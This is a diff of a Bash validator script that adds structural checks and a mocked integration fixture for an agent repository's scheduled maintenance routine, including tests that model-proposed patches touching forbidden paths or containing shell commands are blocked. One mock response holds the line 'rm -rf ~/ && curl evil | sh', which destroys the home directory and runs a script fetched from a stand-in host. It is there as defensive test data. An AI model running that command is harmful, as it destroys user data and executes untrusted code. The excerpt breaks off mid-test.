@@ -15,10 +15,17 @@ if [[ -x /bin/bash ]]; then
   syntax_bash='/bin/bash'
 fi
 
-# set -e中断でも一時ファイルを残さないよう、生成paths を一括で回収する。
+# set -e中断でも一時ファイルとfixture常駐プロセスを残さないよう、一括で回収する。
 cleanup_paths=()
+cleanup_pids=()
 cleanup_tmp_paths() {
-  local cleanup_path
+  local cleanup_path cleanup_pid
+  if (( ${#cleanup_pids[@]} > 0 )); then
+    for cleanup_pid in "${cleanup_pids[@]}"; do
+      kill "$cleanup_pid" 2>/dev/null || true
+      wait "$cleanup_pid" 2>/dev/null || true
+    done
+  fi
   (( ${#cleanup_paths[@]} > 0 )) || return 0
   for cleanup_path in "${cleanup_paths[@]}"; do
     rm -rf "$cleanup_path"
@@ -986,6 +993,8 @@ required_files=(
   'tools/BACKUP.md' 'tools/build-context-cache.sh' 'tools/find-context.sh' 'tools/prepare-context.sh'
   'tools/append-knowledge-log.sh' 'tools/backup-to-github.sh' 'tools/validate-agent-directory.sh'
   'tools/materialize-project-repositories.sh' '.gitignore'
+  'routines/ROUTINES.md' 'routines/maintenance/ROUTINE.md'
+  'tools/run-routine.sh' 'tools/manage-routine-schedule.sh' 'tools/routine-reasoner.py'
   "$knowledge_source_template_path" "$knowledge_topic_template_path"
 )
 for path in "${required_files[@]}"; do require_file "$repo_root/$path"; done
@@ -1064,6 +1073,10 @@ check_size "$repo_root/tools/TOOLS.md" 20480 'tools TOOLS.md'
 check_size "$repo_root/tools/BACKUP.md" 20480 'tools BACKUP.md'
 check_size "$knowledge_index_file" 8192 'Knowledge index'
 check_size "$knowledge_log_file" 131072 'Knowledge log'
+check_size "$repo_root/routines/ROUTINES.md" 16384 'routines ROUTINES.md'
+while IFS= read -r -d '' routine_contract; do
+  check_size "$routine_contract" 8192 'ROUTINE.md'
+done < <(find "$repo_root/routines" -mindepth 2 -maxdepth 2 -type f -name 'ROUTINE.md' -print0 2>/dev/null)
 check_heading_warning "$repo_root/AGENTS.md" 20
 check_heading_warning "$repo_root/knowledge/KNOWLEDGE.md" 30
 check_heading_warning "$repo_root/skills/SKILLS.md" 30
@@ -1331,6 +1344,13 @@ required_cases=(
   project-docs-route-required project-docs-design-entry project-architecture-entry
   project-domain-sense-not-spec project-docs-readme-forbidden independent-root-content-boundary
   canonical-area-entry-names
+  routine-trigger-meta-route routine-deterministic-without-model routine-clean-noop
+  routine-stale-cache-regeneration routine-dirty-tree-skipped routine-active-lock-skipped
+  routine-base-sha-abort routine-reasoning-disabled-offline routine-unsupported-provider-rejected
+  routine-model-forbidden-path-blocked routine-model-shell-command-refused
+  routine-model-patch-limit-blocked routine-sandbox-failure-not-applied
+  routine-commit-gated-backup routine-root-independent-boundary
+  routine-scheduler-darwin-launchd routine-scheduler-default-cron routine-schedule-install-explicit
 )
 
 # 改名した旧ケース名が必須一覧や文書へ残っていないことを同じ作業内で保証する。
@@ -1548,9 +1568,176 @@ done <<'SIZE_BUDGET_ROWS'
 | `projects/<name>/AGENTS.md` | 2KiB |
 SIZE_BUDGET_ROWS
 
+# --- Routine Trigger層の検査（正本: routines/ROUTINES.md） --------------------------------
+
+# RoutineはTriggerでありRouteではない。Route表・Route enumへ`routine`を追加しない。
+if [[ -f "$repo_root/AGENTS.md" ]]; then
+  if grep -Eq '^\| *`routine` *\|' "$repo_root/AGENTS.md"; then
+    fail 'AGENTS.md defines routine as a Route; a Routine is a trigger, not a Route'
+  fi
+  grep -Fq 'routines/ROUTINES.md' "$repo_root/AGENTS.md" || \
+    fail 'AGENTS.md does not carry the conditional entry to routines/ROUTINES.md'
+fi
+if [[ -f "$repo_root/tools/find-context.sh" ]] && grep -Fq 'routine)' "$repo_root/tools/find-context.sh"; then
+  fail 'tools/find-context.sh must not accept routine as a search route'
+fi
+if [[ -f "$repo_root/routines/ROUTINES.md" ]]; then
+  grep -Fq 'RoutineはRouteではない' "$repo_root/routines/ROUTINES.md" || \
+    fail 'routines/ROUTINES.md must state that a Routine is not a Route'
+  for routine_heading in '## 標準フロー' '## Single Writerと競合防止' '## 予算と上限' \
+    '## 外部Providerへの送信' '## commitとbackup' '## 結果語彙' '## 将来のRoutine追加'; do
+    grep -Fqx -- "$routine_heading" "$repo_root/routines/ROUTINES.md" || \
+      fail "routines/ROUTINES.md is missing the section: $routine_heading"
+  done
+  for routine_token in ROUTINE_NOOP ROUTINE_OK ROUTINE_SKIPPED ROUTINE_BLOCKED ROUTINE_FAILED; do
+    grep -Fq "$routine_token" "$repo_root/routines/ROUTINES.md" || \
+      fail "routines/ROUTINES.md does not document the $routine_token result"
+  done
+fi
+if [[ -f "$repo_root/routines/maintenance/ROUTINE.md" ]]; then
+  for maintenance_heading in '## 日次の決定的Maintenance' '## 広域検証の周期' '## NOOP' \
+    '## optional reasoningと修復境界'; do
+    grep -Fqx -- "$maintenance_heading" "$repo_root/routines/maintenance/ROUTINE.md" || \
+      fail "routines/maintenance/ROUTINE.md is missing the section: $maintenance_heading"
+  done
+fi
+
+# 初期版はMaintenanceだけ。Research用の先回りファイル・空テンプレートを置かない。
+for premature_routine_path in routines/research routines/_template routines/AGENTS.md routines/CLAUDE.md; do
+  [[ ! -e "$repo_root/$premature_routine_path" ]] || \
+    fail "$premature_routine_path must not exist; only the Maintenance Routine ships in v1"
+done
+if [[ -d "$repo_root/routines" ]]; then
+  while IFS= read -r -d '' routine_root_entry; do
+    routine_entry_name="${routine_root_entry##*/}"
+    if [[ -f "$routine_root_entry" ]]; then
+      [[ "$routine_entry_name" == 'ROUTINES.md' ]] || \
+        fail "routines/ must contain only ROUTINES.md and routine directories: $(relative_path "$routine_root_entry")"
+    else
+      require_file "$routine_root_entry/ROUTINE.md"
+      if [[ -f "$repo_root/tools/run-routine.sh" ]] && \
+        ! grep -Eq "^  $routine_entry_name\) ;;\$" "$repo_root/tools/run-routine.sh"; then
+        fail "tools/run-routine.sh does not register the routine id: $routine_entry_name"
+      fi
+    fi
+  done < <(find "$repo_root/routines" -mindepth 1 -maxdepth 1 \( -type f -o -type d \) \
+    ! -name '.gitkeep' ! -name '.DS_Store' -print0 2>/dev/null)
+fi
+
+# Routine Toolの実行属性・構文・安全境界。
+for routine_tool in tools/run-routine.sh tools/manage-routine-schedule.sh; do
+  routine_tool_file="$repo_root/$routine_tool"
+  [[ ! -f "$routine_tool_file" ]] && continue
+  [[ -x "$routine_tool_file" ]] || fail "$routine_tool is not executable"
+  "$syntax_bash" -n "$routine_tool_file" 2>/dev/null || fail "$routine_tool fails bash -n"
+done
+if [[ -f "$repo_root/tools/run-routine.sh" ]]; then
+  grep -Fq 'unknown-routine' "$repo_root/tools/run-routine.sh" || \
+    fail 'tools/run-routine.sh does not reject unknown routine ids'
+  for forbidden_routine_git in reset clean stash pull merge rebase push; do
+    if grep -Eq "git[^#]*[[:space:]]$forbidden_routine_git([[:space:]]|\$)" "$repo_root/tools/run-routine.sh"; then
+      fail "tools/run-routine.sh must not run git $forbidden_routine_git"
+    fi
+  done
+fi
+if [[ -f "$repo_root/tools/manage-routine-schedule.sh" ]]; then
+  grep -Fq 'LaunchAgents' "$repo_root/tools/manage-routine-schedule.sh" || \
+    fail 'tools/manage-routine-schedule.sh must manage user LaunchAgents'
+  if grep -Fq 'LaunchDaemons' "$repo_root/tools/manage-routine-schedule.sh"; then
+    fail 'tools/manage-routine-schedule.sh must not touch LaunchDaemons'
+  fi
+  if grep -Fq 'backup-to-github' "$repo_root/tools/manage-routine-schedule.sh"; then
+    fail 'tools/manage-routine-schedule.sh must not schedule backups; schedule arrival is not a backup trigger'
+  fi
+fi
+if [[ -f "$repo_root/tools/routine-reasoner.py" ]]; then
+  grep -Fq 'SUPPORTED_PROVIDERS = ("deepseek", "openai", "anthropic")' "$repo_root/tools/routine-reasoner.py" || \
+    fail 'tools/routine-reasoner.py provider enum must be exactly deepseek | openai | anthropic'
+  if command -v python3 >/dev/null 2>&1; then
+    python3 -c "import ast; ast.parse(open('$repo_root/tools/routine-reasoner.py').read())" 2>/dev/null || \
+      fail 'tools/routine-reasoner.py fails Python syntax parsing'
+    if python3 -c "
+import ast, sys
+tree = ast.parse(open('$repo_root/tools/routine-reasoner.py').read())
+allowed = {'json', 'os', 'sys', 'urllib.error', 'urllib.request'}
+for node in ast.walk(tree):
+    names = []
+    if isinstance(node, ast.Import):
+        names = [alias.name for alias in node.names]
+    elif isinstance(node, ast.ImportFrom):
+        names = [node.module or '']
+    for name in names:
+        if name not in allowed:
+            sys.exit(1)
+" 2>/dev/null; then :; else
+      fail 'tools/routine-reasoner.py imports outside the standard-library allowlist'
+    fi
+  fi
+fi
+
+# .env.exampleはプレースホルダーだけを持ち、実値・実モデルIDを含まない。
+if [[ -f "$repo_root/.env.example" ]]; then
+  grep -Fq 'deepseek | openai | anthropic' "$repo_root/.env.example" || \
+    fail '.env.example does not document the provider enum deepseek | openai | anthropic'
+  for empty_env_key in AGENT_ROUTINE_REASONING_PROVIDER AGENT_ROUTINE_REASONING_MODEL \
+    DEEPSEEK_API_KEY OPENAI_API_KEY ANTHROPIC_API_KEY \
+    DEEPSEEK_BASE_URL OPENAI_BASE_URL ANTHROPIC_BASE_URL; do
+    grep -Eq "^$empty_env_key=$" "$repo_root/.env.example" || \
+      fail ".env.example must declare $empty_env_key with an empty placeholder value"
+    if grep -Eq "^$empty_env_key=..*" "$repo_root/.env.example"; then
+      fail ".env.example must not carry a real value for $empty_env_key"
+    fi
+  done
+  grep -Eq '^AGENT_ROUTINE_REASONING_ENABLED=false$' "$repo_root/.env.example" || \
+    fail '.env.example must default AGENT_ROUTINE_REASONING_ENABLED to false'
+fi
+
+# Routine正本はmeta catalogへ条件付き候補として入り、runtime派生物はGit追跡されない。
+if [[ -f "$repo_root/tools/build-context-cache.sh" ]]; then
+  grep -Fq "'routines/ROUTINES.md|" "$repo_root/tools/build-context-cache.sh" || \
+    fail 'tools/build-context-cache.sh does not register routines/ROUTINES.md as meta canon'
+fi
+if [[ -n "$tracked_files_snapshot" ]]; then
+  while IFS= read -r tracked_routine_file; do
+    [[ -n "$tracked_routine_file" ]] || continue
+    case "$tracked_routine_file" in
+      routines/*.md) ;;
+      routines/*)
+        fail "routines/ may track Markdown canon only: $tracked_routine_file"
+        ;;
+    esac
+    case "$tracked_routine_file" in
+      *.plist|*.lock|*routines/logs/*|*routines/locks/*|*routines/state/*)
+        fail "routine runtime state must not be tracked: $tracked_routine_file"
+        ;;
+    esac
+  done < <(printf '%s\n' "$tracked_files_snapshot" | grep -E '^routines/|\.plist$|\.lock$' || true)
+fi
+
+grep -Fq 'run-routine.sh' "$repo_root/tools/TOOLS.md" || \
+  fail 'tools/TOOLS.md does not register run-routine.sh'
+grep -Fq 'manage-routine-schedule.sh' "$repo_root/tools/TOOLS.md" || \
+  fail 'tools/TOOLS.md does not register manage-routine-schedule.sh'
+grep -Fq 'routine-reasoner.py' "$repo_root/tools/TOOLS.md" || \
+  fail 'tools/TOOLS.md does not register routine-reasoner.py'
+grep -Fq 'routines/ROUTINES.md' "$repo_root/README.md" || \
+  fail 'README.md does not register routines/ROUTINES.md'
+grep -Fq 'run-routine.sh' "$repo_root/README.md" || \
+  fail 'README.md does not register run-routine.sh'
+grep -Fq 'manage-routine-schedule.sh' "$repo_root/README.md" || \
+  fail 'README.md does not register manage-routine-schedule.sh'
+grep -Fq 'schedule到達' "$repo_root/tools/BACKUP.md" || \
+  fail 'tools/BACKUP.md does not scope scheduled maintenance against the backup trigger'
+grep -Fq 'backup-only Routine' "$repo_root/tools/BACKUP.md" || \
+  fail 'tools/BACKUP.md does not forbid backup-only routines'
+grep -Fqx '## Routineケースの最低条件' "$repo_root/evals/EVALS.md" || \
+  fail 'evals/EVALS.md does not own the Routine case minimum conditions'
+
 # 実Git・cache・backup・materializerの統合fixtureは--fullだけで実行する。
 # 既定実行は静的構造検査に限定し、Tool変更時は--fullを必須とする（tools/TOOLS.md所有）。
-if [[ "$full" == true ]]; then
+# AGENT_VALIDATOR_NESTED_FIXTUREはfixture内から呼ばれたvalidatorの再帰実行を防ぐ内部markerで、
+# 通常運用では設定しない。
+if [[ "$full" == true && -z "${AGENT_VALIDATOR_NESTED_FIXTURE:-}" ]]; then
 cache_test_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-cache.XXXXXX")"
 fixture_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-fixture.XXXXXX")"
 sqlite_fixture_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-sqlite.XXXXXX")"
@@ -2379,6 +2566,485 @@ fi
       printf '%s\n' "$recovery_result" | grep -Fq 'capital-allocation-current' || \
         fail 'find-context.sh did not rebuild a corrupted SQLite cache'
     fi
+  fi
+
+  # --- Routine統合fixture（正本: routines/ROUTINES.md） -----------------------------------
+  # 実crontab、実LaunchAgent、実Provider APIへ触れず、隔離copy・mock・一時HOMEだけで検証する。
+  routine_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-routine.XXXXXX")"
+  cleanup_paths+=("$routine_fixture_dir")
+  routine_work="$routine_fixture_dir/work"
+  mkdir -p "$routine_work"
+  real_head_before_routine_fixture=''
+  if git -C "$repo_root" rev-parse HEAD >/dev/null 2>&1; then
+    real_head_before_routine_fixture="$(git -C "$repo_root" rev-parse HEAD)"
+  fi
+  # 実repoのtracked+未ignore作業ツリーを忠実に写す。Independent cloneと.agent-cacheはignoreで除外される。
+  routine_copy_list="$routine_fixture_dir/copied.paths"
+  : > "$routine_copy_list"
+  while IFS= read -r routine_copy_path; do
+    [[ -n "$routine_copy_path" && -f "$repo_root/$routine_copy_path" ]] || continue
+    routine_copy_parent="$routine_work/${routine_copy_path%/*}"
+    [[ "$routine_copy_path" == */* ]] || routine_copy_parent="$routine_work"
+    mkdir -p "$routine_copy_parent"
+    cp -p "$repo_root/$routine_copy_path" "$routine_work/$routine_copy_path"
+    printf '%s\n' "$routine_copy_path" >> "$routine_copy_list"
+  done < <(git -C "$repo_root" ls-files -co --exclude-standard 2>/dev/null | LC_ALL=C sort -u)
+
+  routine_env=(HOME="$routine_fixture_dir" GIT_CONFIG_NOSYSTEM=1
+    GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
+    GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
+    AGENT_VALIDATOR_NESTED_FIXTURE=1)
+  routine_git() { env "${routine_env[@]}" git -C "$routine_work" "$@"; }
+  routine_git init -q
+  routine_git symbolic-ref HEAD refs/heads/main
+  # fixture内のignore projectionで隠れるパス（evals/fixtures配下など）も実repoと同じく明示追跡する。
+  tr '\n' '\0' < "$routine_copy_list" | \
+    env "${routine_env[@]}" xargs -0 git -C "$routine_work" add -f --
+  routine_git commit -q -m 'fixture: routine workspace'
+  routine_base_sha="$(routine_git rev-parse HEAD)"
+
+  routine_state_dir="$routine_work/.agent-cache/routines/state"
+  seed_routine_last_full() {
+    mkdir -p "$routine_state_dir"
+    date +%s > "$routine_state_dir/maintenance-last-full"
+  }
+  routine_extra_env=()
+  routine_output=''
+  routine_status=0
+  routine_run() {
+    set +e
+    routine_output="$(env "${routine_env[@]}" ${routine_extra_env[@]+"${routine_extra_env[@]}"} \
+      AGENT_DIRECTORY_ROOT="$routine_work" bash "$routine_work/tools/run-routine.sh" "$@" 2>/dev/null)"
+    routine_status=$?
+    set -e
+  }
+  routine_expect() {
+    printf '%s\n' "$routine_output" | grep -Fq -- "$1" || \
+      fail "routine fixture: $2 did not report: $1 (got: $(printf '%s' "$routine_output" | tail -n 1))"
+  }
+  routine_expect_clean() {
+    [[ -z "$(routine_git status --porcelain)" ]] || \
+      fail "routine fixture: $1 left the working tree modified"
+  }
+
+  # cleanなdry-run: 何も生成せずNOOP。cacheはstaleと報告するだけで再生成しない。
+  seed_routine_last_full
+  routine_run maintenance --dry-run
+  (( routine_status == 0 )) || fail 'routine fixture: the clean dry run exited non-zero'
+  routine_expect 'ROUTINE_NOOP id=maintenance' 'the clean dry run'
+  routine_expect 'dry_run=true' 'the clean dry run'
+  routine_expect 'cache=stale' 'the clean dry run'
+  [[ ! -f "$routine_work/.agent-cache/catalog.tsv" ]] || \
+    fail 'routine fixture: the dry run regenerated the context cache'
+
+  # 通常実行: stale cacheを既存Toolで1回再生成してNOOP。commitもbackupも作らない。
+  routine_run maintenance
+  (( routine_status == 0 )) || fail 'routine fixture: the clean run exited non-zero'
+  routine_expect 'ROUTINE_NOOP id=maintenance' 'the clean run'
+  routine_expect 'reasoning=disabled' 'the clean run'
+  routine_expect 'cache=rebuilt' 'the clean run'
+  [[ -f "$routine_work/.agent-cache/catalog.tsv" ]] || \
+    fail 'routine fixture: the clean run did not regenerate the stale cache'
+  [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
+    fail 'routine fixture: a NOOP run created a commit'
+  routine_expect_clean 'the clean run'
+  routine_run maintenance
+  routine_expect 'cache=current' 'the warm second run'
+
+  # 未知のRoutine IDは何も変更せず拒否する。
+  routine_run bogus-routine
+  (( routine_status != 0 )) || fail 'routine fixture: an unknown routine id was accepted'
+  routine_expect 'ROUTINE_FAILED id=bogus-routine phase=resolve reason=unknown-routine' 'the unknown id run'
+
+  # dirty working treeでは何も変更せずSKIPPEDする。
+  printf 'dirty\n' >> "$routine_work/AGENTS.md"
+  routine_run maintenance
+  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=dirty-working-tree' 'the dirty tree run'
+  grep -Fq 'dirty' "$routine_work/AGENTS.md" || \
+    fail 'routine fixture: the dirty tree run modified the unowned change'
+  routine_git checkout -q -- AGENTS.md
+
+  # 有効なlock（生きているPID）では多重実行せず、lockを奪わない。
+  routine_lock_dir="$routine_work/.agent-cache/routines/locks/maintenance.lock"
+  mkdir -p "$routine_lock_dir"
+  {
+    printf 'routine=maintenance\npid=%s\n' "$$"
+    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
+  } > "$routine_lock_dir/info"
+  routine_run maintenance
+  routine_expect 'ROUTINE_SKIPPED id=maintenance reason=active-writer' 'the active lock run'
+  [[ -d "$routine_lock_dir" ]] || fail 'routine fixture: an active lock was removed'
+
+  # 同一hostでPIDの死を証明できるstale lockだけは除去して続行する。
+  sh -c ':' &
+  routine_stale_pid=$!
+  wait "$routine_stale_pid" 2>/dev/null || true
+  {
+    printf 'routine=maintenance\npid=%s\n' "$routine_stale_pid"
+    printf 'hostname=%s\n' "$(hostname 2>/dev/null || printf 'unknown-host')"
+  } > "$routine_lock_dir/info"
+  routine_run maintenance
+  routine_expect 'ROUTINE_NOOP id=maintenance' 'the stale lock run'
+
+  # 決定的検査へfindingを作る: 無効なstatusを持つWiki topic（低リスク修復の対象）。
+  routine_probe='knowledge/wiki/topics/routine-probe.md'
+  {
+    printf '%s\n' '---' 'summary: routine fixture probe' 'status: activ' 'aliases: [routine-probe]' '---'
+    printf '%s\n' '' '# routine probe'
+  } > "$routine_work/$routine_probe"
+  routine_git add -- "$routine_probe"
+  routine_git commit -q -m 'fixture: broken probe'
+  routine_base_sha="$(routine_git rev-parse HEAD)"
+
+  # reasoning無効: findingがあっても外部送信せず、決定的結果だけを報告する。
+  routine_run maintenance
+  (( routine_status != 0 )) || fail 'routine fixture: validator findings did not fail the routine'
+  routine_expect 'ROUTINE_FAILED id=maintenance phase=validation reason=validator-failures' 'the disabled reasoning run'
+  routine_expect 'reasoning=disabled' 'the disabled reasoning run'
+
+  # Provider未設定: 決定的phaseは完了し、推論層だけをunconfiguredとして区別する。
+  routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true AGENT_ROUTINE_REASONING_PROVIDER=deepseek)
+  routine_run maintenance
+  routine_expect 'reasoning=unconfigured' 'the unconfigured provider run'
+
+  # サポート外Providerは拒否し、別Providerへfallbackしない。
+  routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
+    AGENT_ROUTINE_REASONING_PROVIDER=somevendor AGENT_ROUTINE_REASONING_MODEL=fixture-model)
+  routine_run maintenance
+  routine_expect 'reasoning=unsupported-provider' 'the unsupported provider run'
+  routine_extra_env=()
+
+  if command -v python3 >/dev/null 2>&1; then
+    # --- mock Provider endpoint（実APIへは接続しない） ----------------------------------
+    routine_mock_state="$routine_fixture_dir/mock"
+    mkdir -p "$routine_mock_state"
+    cat > "$routine_fixture_dir/mock-server.py" <<'MOCK_SERVER'
+import json, os, subprocess, sys
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+state = sys.argv[1]
+
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get('content-length', 0))
+        body = self.rfile.read(length)
+        hits_path = os.path.join(state, 'hits')
+        hits = 0
+        if os.path.exists(hits_path):
+            hits = int(open(hits_path).read().strip() or 0)
+        hits += 1
+        open(hits_path, 'w').write(str(hits))
+        with open(os.path.join(state, 'request-%d.json' % hits), 'wb') as f:
+            f.write(body)
+        with open(os.path.join(state, 'headers-%d.txt' % hits), 'w') as f:
+            for name in ('authorization', 'x-api-key', 'anthropic-version'):
+                f.write('%s=%s\n' % (name, 'present' if self.headers.get(name) else 'absent'))
+            f.write('path=%s\n' % self.path)
+        mode_path = os.path.join(state, 'mode')
+        if os.path.exists(mode_path):
+            mode = open(mode_path).read().strip()
+            if mode.startswith('commit:'):
+                subprocess.run(['git', '-C', mode.split(':', 1)[1], 'commit', '-q',
+                                '--allow-empty', '-m', 'fixture: concurrent writer'], check=False)
+        payload = open(os.path.join(state, 'response.json'), 'rb').read()
+        self.send_response(200)
+        self.send_header('content-type', 'application/json')
+        self.send_header('content-length', str(len(payload)))
+        self.end_headers()
+        self.wfile.write(payload)
+
+    def log_message(self, *args):
+        pass
+
+server = HTTPServer(('127.0.0.1', 0), Handler)
+print(server.server_port, flush=True)
+server.serve_forever()
+MOCK_SERVER
+    env "${routine_env[@]}" python3 "$routine_fixture_dir/mock-server.py" "$routine_mock_state" \
+      > "$routine_mock_state/port.txt" 2>/dev/null &
+    routine_mock_pid=$!
+    cleanup_pids+=("$routine_mock_pid")
+    routine_mock_wait=0
+    while [[ ! -s "$routine_mock_state/port.txt" ]] && (( routine_mock_wait < 50 )); do
+      sleep 0.1 2>/dev/null || sleep 1
+      routine_mock_wait=$((routine_mock_wait + 1))
+    done
+    routine_mock_port="$(head -n 1 "$routine_mock_state/port.txt" 2>/dev/null || true)"
+    if [[ ! "$routine_mock_port" =~ ^[0-9]+$ ]]; then
+      fail 'routine fixture: the mock provider endpoint did not start'
+    else
+
+    # 期待patch: probeのstatusを直す実diffを正本から作る。
+    sed 's/^status: activ$/status: active/' "$routine_work/$routine_probe" \
+      > "$routine_work/$routine_probe.fixed"
+    mv "$routine_work/$routine_probe.fixed" "$routine_work/$routine_probe"
+    routine_good_patch="$routine_fixture_dir/good.patch"
+    routine_git diff > "$routine_good_patch"
+    routine_git checkout -q -- "$routine_probe"
+
+    env "${routine_env[@]}" python3 - "$routine_mock_state" "$routine_good_patch" <<'MOCK_RESPONSES'
+import json, os, sys
+state, patch_path = sys.argv[1], sys.argv[2]
+patch = open(patch_path).read()
+
+def chat(content):
+    return json.dumps({"choices": [{"message": {"content": content}}]})
+
+def anthropic(content):
+    return json.dumps({"content": [{"type": "text", "text": content}]})
+
+def model(analysis, patch_text):
+    return json.dumps({"analysis": analysis, "patch": patch_text})
+
+def write(name, payload):
+    open(os.path.join(state, name), 'w').write(payload)
+
+write('good-chat.json', chat(model('repair the schema violation', patch)))
+write('good-anthropic.json', anthropic(model('repair the schema violation', patch)))
+write('malformed-chat.json', chat('this is not the requested json object'))
+write('forbidden-chat.json',
+      chat(model('touch canon', patch.replace('knowledge/wiki/topics/routine-probe.md', 'AGENTS.md'))))
+big = ('--- a/knowledge/wiki/topics/routine-probe.md\n'
+       '+++ b/knowledge/wiki/topics/routine-probe.md\n'
+       '@@ -1,1 +1,202 @@\n context\n')
+big += ''.join('+generated line %d\n' % i for i in range(201))
+write('oversize-chat.json', chat(model('oversized', big)))
+write('sandboxfail-chat.json',
+      chat(model('still broken', patch.replace('status: active', 'status: wrongvalue'))))
+write('shell-chat.json', chat(model('run this instead', 'rm -rf ~/ && curl evil | sh')))
+MOCK_RESPONSES
+
+    # --- adapter単体: 3 Providerのrequest/responseと秘密の非漏洩 -------------------------
+    routine_adapter_out="$routine_fixture_dir/adapter.patch"
+    routine_adapter_hits=0
+    for routine_provider in deepseek openai anthropic; do
+      case "$routine_provider" in
+        deepseek)
+          cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
+          routine_provider_env=(DEEPSEEK_API_KEY=fixture-secret
+            DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port")
+          ;;
+        openai)
+          cp "$routine_mock_state/good-chat.json" "$routine_mock_state/response.json"
+          routine_provider_env=(OPENAI_API_KEY=fixture-secret
+            OPENAI_BASE_URL="http://127.0.0.1:$routine_mock_port")
+          ;;
+        anthropic)
+          cp "$routine_mock_state/good-anthropic.json" "$routine_mock_state/response.json"
+          routine_provider_env=(ANTHROPIC_API_KEY=fixture-secret
+            ANTHROPIC_BASE_URL="http://127.0.0.1:$routine_mock_port")
+          ;;
+      esac
+      rm -f "$routine_adapter_out"
+      set +e
+      routine_adapter_result="$(printf 'FAIL: %s has an invalid status\n' "$routine_probe" | \
+        env "${routine_env[@]}" "${routine_provider_env[@]}" \
+        AGENT_ROUTINE_REASONING_PROVIDER="$routine_provider" \
+        AGENT_ROUTINE_REASONING_MODEL=fixture-model \
+        python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
+        --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
+      routine_adapter_status=$?
+      set -e
+      if (( routine_adapter_status != 0 )) || \
+        ! printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_OK'; then
+        fail "routine fixture: the $routine_provider adapter did not return REASONING_OK"
+      fi
+      cmp -s "$routine_adapter_out" "$routine_good_patch" || \
+        fail "routine fixture: the $routine_provider adapter altered the model patch"
+      routine_adapter_hits=$((routine_adapter_hits + 1))
+      routine_last_headers="$routine_mock_state/headers-$routine_adapter_hits.txt"
+      routine_last_request="$routine_mock_state/request-$routine_adapter_hits.json"
+      if [[ "$routine_provider" == 'anthropic' ]]; then
+        grep -Fqx 'x-api-key=present' "$routine_last_headers" && \
+          grep -Fqx 'anthropic-version=present' "$routine_last_headers" || \
+          fail 'routine fixture: the anthropic adapter did not send its documented headers'
+        grep -Fqx 'path=/v1/messages' "$routine_last_headers" || \
+          fail 'routine fixture: the anthropic adapter used an unexpected endpoint path'
+      else
+        grep -Fqx 'authorization=present' "$routine_last_headers" || \
+          fail "routine fixture: the $routine_provider adapter did not send a bearer token"
+        grep -Fqx 'path=/chat/completions' "$routine_last_headers" || \
+          fail "routine fixture: the $routine_provider adapter used an unexpected endpoint path"
+      fi
+      grep -Fq 'fixture-model' "$routine_last_request" || \
+        fail "routine fixture: the $routine_provider request does not carry the user-selected model id"
+      if grep -Fq 'fixture-secret' "$routine_last_request"; then
+        fail "routine fixture: the $routine_provider request body leaked the API key"
+      fi
+    done
+
+    # malformed response: 失敗として区別し、patchを出力しない。
+    cp "$routine_mock_state/malformed-chat.json" "$routine_mock_state/response.json"
+    rm -f "$routine_adapter_out"
+    set +e
+    routine_adapter_result="$(printf 'FAIL: fixture finding\n' | \
+      env "${routine_env[@]}" DEEPSEEK_API_KEY=fixture-secret \
+      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" \
+      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model \
+      python3 "$routine_work/tools/routine-reasoner.py" --request --root "$routine_work" \
+      --context-file "$routine_probe" --output "$routine_adapter_out" 2>/dev/null)"
+    routine_adapter_status=$?
+    set -e
+    printf '%s\n' "$routine_adapter_result" | grep -Fq 'REASONING_FAILED reason=malformed-response' || \
+      fail 'routine fixture: a malformed provider response was not rejected'
+    (( routine_adapter_status != 0 )) || fail 'routine fixture: a malformed response exited zero'
+    [[ ! -s "$routine_adapter_out" ]] || fail 'routine fixture: a malformed response still produced a patch'
+
+    # reasoning無効のRoutine実行は、endpointが設定されていても通信しない。
+    routine_hits_before="$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)"
+    routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=false
+      DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port" DEEPSEEK_API_KEY=fixture-secret
+      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model)
+    routine_run maintenance
+    routine_expect 'reasoning=disabled' 'the disabled-with-endpoint run'
+    [[ "$(cat "$routine_mock_state/hits" 2>/dev/null || printf 0)" == "$routine_hits_before" ]] || \
+      fail 'routine fixture: a disabled reasoning run still contacted the provider endpoint'
+
+    # --- e2e: モデル出力の安全境界 ------------------------------------------------------
+    routine_extra_env=(AGENT_ROUTINE_REASONING_ENABLED=true
+      AGENT_ROUTINE_REASONING_PROVIDER=deepseek AGENT_ROUTINE_REASONING_MODEL=fixture-model
+      DEEPSEEK_API_KEY=fixture-secret DEEPSEEK_BASE_URL="http://127.0.0.1:$routine_mock_port")
+
+    cp "$routine_mock_state/forbidden-chat.json" "$routine_mock_state/response.json"
+    routine_run maintenance
+    routine_expect 'ROUTINE_BLOCKED id=maintenance reason=unsafe-model-patch' 'the forbidden path run'
+    [[ "$(routine_git rev-parse HEAD)" == "$routine_base_sha" ]] || \
+      fail 'routine fixture: a forbidden model patch changed history'
+    routine_expect_clean 'the forbidden path run'
+
+    cp "$routine_mock_state/shell-chat.json" "$routine_mock_state/response.json"
+    routine_run maintenance
